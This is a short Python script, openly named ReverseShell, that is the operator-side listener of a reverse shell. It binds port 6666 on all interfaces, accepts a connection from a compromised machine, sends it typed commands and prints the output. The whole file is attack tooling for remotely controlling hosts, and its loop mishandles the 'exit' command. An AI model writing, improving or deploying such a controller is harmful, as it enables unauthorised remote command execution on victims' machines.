import socket

class ReverseShell:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def connector(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(1)
        print (f"Listening for connection on port {self.port}")
        conn, addr = s.accept()
        while True:
            command = input("Please enter your command:")
            if len(command)>0:
                conn.send(bytes(command,"utf-8"))
                response = conn.recv(self.port)
                string_response = response.decode("utf-8")
                if len(response) > 0:
                    print (string_response)
            if command.lower() == "exit":
                conn.close()
                s.close()



if __name__ == '__main__':
    host = '0.0.0.0'
    port = 6666
    x = ReverseShell(host, port)
    x.connector()
